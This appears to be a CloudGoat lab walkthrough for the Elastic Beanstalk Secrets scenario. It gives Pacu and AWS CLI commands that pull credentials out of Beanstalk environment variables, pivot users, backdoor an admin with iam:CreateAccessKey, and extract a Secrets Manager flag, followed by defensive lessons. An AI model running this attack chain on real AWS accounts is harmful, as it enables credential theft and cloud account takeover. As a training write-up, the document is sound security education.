# Elastic Beanstalk Secrets — CloudGoat

*Exploiting misconfigured Elastic Beanstalk environment variables to extract embedded credentials and escalate from low-privilege reconnaissance to administrative access*

## Overview

The Elastic Beanstalk Secrets scenario demonstrates a critical security vulnerability that plagues many AWS deployments: the practice of storing sensitive credentials directly in application environment variables. This walkthrough illustrates how attackers can discover hardcoded secrets in Elastic Beanstalk configurations, pivot through multiple user identities, and ultimately achieve full administrative access to extract protected secrets.

Understanding this attack chain is essential because it highlights the dangers of treating environment variables as secure storage mechanisms. While convenient for developers, environment variables in managed services like Elastic Beanstalk are accessible through multiple avenues—API calls, console interfaces, and enumeration tools. Every credential stored in an environment variable represents a potential privilege escalation pathway that can transform a low-privilege foothold into complete infrastructure compromise.

---

## Setting Up the Lab Environment

### **Launching the CloudGoat Scenario**

Begin by deploying the Elastic Beanstalk Secrets scenario:

```bash
$ cloudgoat create beanstalk_secrets
```

This command provisions the vulnerable AWS infrastructure including an Elastic Beanstalk application with embedded credentials in its environment configuration.

---

## Initial Access and Identity Verification

### **CloudGoat Credentials**

Once deployed, CloudGoat provides initial credentials for a low-privilege user:

```
initial_low_priv_credentials = Access Key: [REDACTED_ACCESS_KEY]
Secret Key: [REDACTED_SECRET_KEY]
```

### **Configuring AWS CLI**

Configure the AWS CLI with the provided low-privilege credentials:

```bash
$ aws configure --profile cgbean
AWS Access Key ID [None]: [REDACTED_ACCESS_KEY]
AWS Secret Access Key [None]: [REDACTED_SECRET_KEY]
Default region name [None]: us-east-1
Default output format [None]: json
```

### **Verifying Your Identity**

Confirm your current AWS identity:

```bash
$ aws sts get-caller-identity --profile cgbean
{
    "UserId": "AIDAXHVUFMEMEFHLT4CF3",
    "Account": "497520304408",
    "Arn": "arn:aws:iam::497520304408:user/cgido6b39u7ra9_low_priv_user"
}
```

**Initial Foothold:** You are operating as **cgido6b39u7ra9_low_priv_user**, a heavily restricted IAM user with limited permissions. The objective is to discover what services and resources this user can enumerate.

---

## Elastic Beanstalk Enumeration — Discovering Hidden Credentials

### **Initializing PACU**

Launch PACU and create a new session for this engagement:

```bash
$ pacu --new-session cgbean
Session cgbean created.

$ pacu
[... PACU banner redacted for brevity]

Choose an option: 8

Pacu (cgbean:No Keys Set) > import_keys cgbean
  Imported keys as "imported-cgbean"
```

### **Enumerating Elastic Beanstalk Environments**

Execute the Elastic Beanstalk enumeration module to discover applications and their configurations:

```bash
Pacu (cgbean:imported-cgbean) > run elasticbeanstalk__enum --regions us-east-1
  Running module elasticbeanstalk__enum...
[elasticbeanstalk__enum] Enumerating BeanStalk data in region us-east-1...
[elasticbeanstalk__enum]   1 application(s) found in us-east-1.
[elasticbeanstalk__enum]   1 environment(s) found in us-east-1.
        Potential secret in environment variable: SSHSourceRestriction => tcp,22,22,0.0.0.0/0
        Potential secret in environment variable: EnvironmentVariables => SECONDARY_SECRET_KEY=[REDACTED_SECRET_KEY],PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=[REDACTED_ACCESS_KEY]
        Potential secret in environment variable: SECONDARY_ACCESS_KEY => [REDACTED_ACCESS_KEY]
[elasticbeanstalk__enum]   1 configuration setting(s) found in us-east-1.
[elasticbeanstalk__enum]   3 potential secret(s) found in config settings and saved to: /home/kali/.local/share/pacu/cgbean/downloads/beanstalk_secrets_cgbean_us-east-1.txt
[elasticbeanstalk__enum]   1 environment(s) with tags found in us-east-1.
[elasticbeanstalk__enum] elasticbeanstalk__enum completed.

[elasticbeanstalk__enum] MODULE SUMMARY:

    1 total application(s) found.
    1 total environment(s) found.
    1 total configuration setting group(s) found.
    1 environment(s) with tags enumerated.
    3 potential secret(s) discovered in config settings.
```

**Critical Discovery:** PACU has discovered AWS credentials embedded in the Elastic Beanstalk environment variables:
- **SECONDARY_ACCESS_KEY** — An AWS Access Key ID
- **SECONDARY_SECRET_KEY** — The corresponding Secret Access Key

These credentials represent a secondary user account that may have elevated permissions compared to our current low-privilege user.

**Alternative Discovery Method:** This same information can also be discovered through the AWS Console by navigating to:
1. Elastic Beanstalk service
2. Select the environment
3. Click "Configuration"
4. View "Environment properties"

The console displays the environment variables in a table format:

| Source | Key | Value |
|--------|-----|-------|
| Plain text | PYTHONPATH | /var/app/venv/staging-LQM1lest/bin |
| Plain text | SECONDARY_ACCESS_KEY | [REDACTED_ACCESS_KEY] |
| Plain text | SECONDARY_SECRET_KEY | [REDACTED_SECRET_KEY] |

---

## Credential Pivot — Assuming the Secondary User Identity

### **Configuring the Secondary User Profile**

Configure a new AWS CLI profile using the discovered Elastic Beanstalk credentials:

```bash
$ aws configure --profile beanenv
AWS Access Key ID [None]: [REDACTED_ACCESS_KEY]
AWS Secret Access Key [None]: [REDACTED_SECRET_KEY]
Default region name [None]: us-east-1
Default output format [None]: json
```

### **Verifying the Secondary User Identity**

Confirm the identity of the secondary user:

```bash
$ aws sts get-caller-identity --profile beanenv
{
    "UserId": "AIDAXHVUFMEMLX3K22STU",
    "Account": "497520304408",
    "Arn": "arn:aws:iam::497520304408:user/cgido6b39u7ra9_secondary_user"
}
```

**Successful Pivot:** We are now operating as **cgido6b39u7ra9_secondary_user**. This represents a lateral movement from the low-privilege user to a potentially more capable identity.

---

## Privilege Escalation Analysis — IAM Reconnaissance

### **Setting Up PACU for the Secondary User**

Create a new PACU session for the secondary user credentials:

```bash
$ pacu --new-session beanenv
Session beanenv created.

$ pacu
[... PACU banner redacted for brevity]

Choose an option: 9

Pacu (beanenv:No Keys Set) > import_keys beanenv
  Imported keys as "imported-beanenv"
```

### **Scanning for Privilege Escalation Vectors**

Execute the IAM privilege escalation scan module to identify potential escalation paths:

```bash
Pacu (beanenv:imported-beanenv) > run iam__privesc_scan --user-methods CreateAccessKey
  Running module iam__privesc_scan...
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   POTENTIAL: CreateAccessKey
[iam__privesc_scan] No confirmed privilege escalation methods were found.
[iam__privesc_scan] Attempting potential privilege escalation methods...
[iam__privesc_scan]   Starting method CreateAccessKey...

[iam__privesc_scan]     Is there a specific user you want to target? They must not already have two sets of access keys created for their user. Enter their user name now or just hit enter to enumerate users and view a list of options: 
[iam__privesc_scan] Found 4 user(s). Choose a user below.
[iam__privesc_scan]   [0] Other (Manually enter user name)
[iam__privesc_scan]   [1] cgido6b39u7ra9_admin_user
[iam__privesc_scan]   [2] cgido6b39u7ra9_low_priv_user
[iam__privesc_scan]   [3] cgido6b39u7ra9_secondary_user
[iam__privesc_scan]   [4] cloudgoat
[iam__privesc_scan] Choose an option: 1
[iam__privesc_scan]   Running module iam__backdoor_users_keys...
[iam__backdoor_users_keys] Backdoor the following users?
[iam__backdoor_users_keys]   cgido6b39u7ra9_admin_user
[iam__backdoor_users_keys]     Access Key ID: [REDACTED_ACCESS_KEY]
[iam__backdoor_users_keys]     Secret Key: [REDACTED_SECRET_KEY]
[iam__backdoor_users_keys] iam__backdoor_users_keys completed.
```

**Strategic Breakthrough:** The secondary user has the **iam:CreateAccessKey** permission, which allows creating new access keys for other IAM users. PACU successfully enumerated four users in the account and we selected the **cgido6b39u7ra9_admin_user** as our target. PACU then created a new set of access keys for the admin user, effectively giving us backdoor access to administrative privileges.

**Why This Is Dangerous:** The **iam:CreateAccessKey** permission is a powerful privilege escalation vector. Any user with this permission can generate access keys for users with higher privileges, effectively assuming their identity without needing their passwords or existing credentials. This is a persistence mechanism that allows attackers to maintain access even if the original compromised credentials are rotated.

---

## Administrative Access — Final Privilege Escalation

### **Configuring the Admin User Profile**

Configure AWS CLI with the newly created admin user credentials:

```bash
$ aws configure --profile cgbeanadmin
AWS Access Key ID [None]: [REDACTED_ACCESS_KEY]
AWS Secret Access Key [None]: [REDACTED_SECRET_KEY]
Default region name [None]: us-east-1
Default output format [None]: json
```

### **Verifying Admin Identity**

Confirm successful escalation to admin privileges:

```bash
$ aws sts get-caller-identity --profile cgbeanadmin
{
    "UserId": "AIDAXHVUFMEMKZ3SILKQ5",
    "Account": "497520304408",
    "Arn": "arn:aws:iam::497520304408:user/cgido6b39u7ra9_admin_user"
}
```

**Privilege Escalation Complete:** We are now operating as **cgido6b39u7ra9_admin_user**, which should have administrative or near-administrative permissions.

### **Setting Up PACU for Admin Access**

Create a PACU session for the admin user:

```bash
$ pacu --new-session cgbeanadmin
Session cgbeanadmin created.

$ pacu
[... PACU banner redacted for brevity]

Choose an option: 10

Pacu (cgbeanadmin:imported-cgbean) > import_keys cgbeanadmin
  Imported keys as "imported-cgbeanadmin"
```

---

## Secret Extraction — Discovering the Final Objective

### **Enumerating AWS Secrets Manager**

With administrative privileges, enumerate AWS Secrets Manager to discover stored secrets:

```bash
Pacu (cgbeanadmin:imported-cgbeanadmin) > run secrets__enum --regions us-east-1
  Running module secrets__enum...
[secrets__enum] Starting region us-east-1...
[secrets__enum]  Found secret: cgido6b39u7ra9_final_flag
[secrets__enum] Probing Secret: cgido6b39u7ra9_final_flag
[secrets__enum] Probing parameter store
[secrets__enum] secrets__enum completed.

[secrets__enum] MODULE SUMMARY:

    1 Secret(s) were found in AWS secretsmanager
    0 Parameter(s) were found in AWS Systems Manager Parameter Store    
    Check ~/.local/share/pacu/<session name>/downloads/secrets/ to get the values
```

**Success:** A secret named **cgido6b39u7ra9_final_flag** has been discovered in AWS Secrets Manager. PACU automatically extracted the secret value and saved it to the local downloads directory.

### **Retrieving the Final Flag**

Navigate to the PACU downloads directory and retrieve the secret:

```bash
$ cd ~/.local/share/pacu/cgbeanadmin/downloads/secrets/secrets_manager

$ ls
secrets.txt

$ cat secrets.txt
cgido6b39u7ra9_final_flag:[FLAG_REDACTED]
```

**Objective Achieved:** The final flag has been successfully extracted from AWS Secrets Manager, demonstrating complete compromise of the AWS environment through the Elastic Beanstalk credential exposure chain.

---

## Attack Chain Summary

The privilege escalation follows a multi-stage attack progression:

**Stage 1: Initial Foothold** → Low-privilege **cgido6b39u7ra9_low_priv_user** with limited enumeration capabilities

**Stage 2: Service Enumeration** → Discovered Elastic Beanstalk application with embedded environment variable credentials

**Stage 3: Credential Extraction** → Retrieved **SECONDARY_ACCESS_KEY** and **SECONDARY_SECRET_KEY** from Beanstalk configuration

**Stage 4: Lateral Movement** → Pivoted to **cgido6b39u7ra9_secondary_user** identity

**Stage 5: Permission Discovery** → Identified **iam:CreateAccessKey** permission on secondary user

**Stage 6: Privilege Escalation** → Created new access keys for **cgido6b39u7ra9_admin_user**

**Stage 7: Administrative Access** → Assumed admin user identity with elevated privileges

**Stage 8: Secret Extraction** → Enumerated and retrieved final flag from AWS Secrets Manager

---

## Key Takeaways and Security Lessons

This scenario demonstrates critical security principles that apply to real-world AWS environments:

**Environment Variables Are Not Secret Storage** — Elastic Beanstalk environment variables are plainly visible to anyone with read access to the environment configuration. Credentials should never be stored in environment variables; use AWS Secrets Manager or Systems Manager Parameter Store with proper IAM restrictions instead.

**The Danger of iam:CreateAccessKey** — The ability to create access keys for other users is a powerful privilege escalation vector. This permission should be heavily restricted and only granted to trusted automation systems with proper audit logging. Users who can create keys for more privileged accounts effectively inherit those privileges.

**Principle of Least Privilege Violations** — The secondary user embedded in Beanstalk should not have had permission to create access keys for admin users. Every credential should have the minimum permissions necessary for its intended function.

**Credential Chaining Amplifies Risk** — A single misconfigured environment variable led to a complete compromise through a chain of credential discoveries and permission abuses. Each step in the chain represented a security control that failed, demonstrating the importance of defense in depth.

**Service Configuration Enumeration** — Many AWS services expose configuration details through APIs. Attackers with even limited read permissions can discover sensitive information embedded in service configurations. Regular audits of service configurations should be performed to identify exposed credentials.

**Secrets Manager as the Target** — While Secrets Manager is the correct place to store secrets, it becomes a high-value target once an attacker gains administrative access. Secrets Manager access should be restricted with resource-based policies and monitored with CloudTrail logging to detect unauthorized access attempts.

**Console Access Provides Same Information** — Security through obscurity doesn't work in AWS. The same credentials discoverable through PACU can be found by clicking through the AWS Console, making these misconfigurations accessible to attackers with any level of technical sophistication.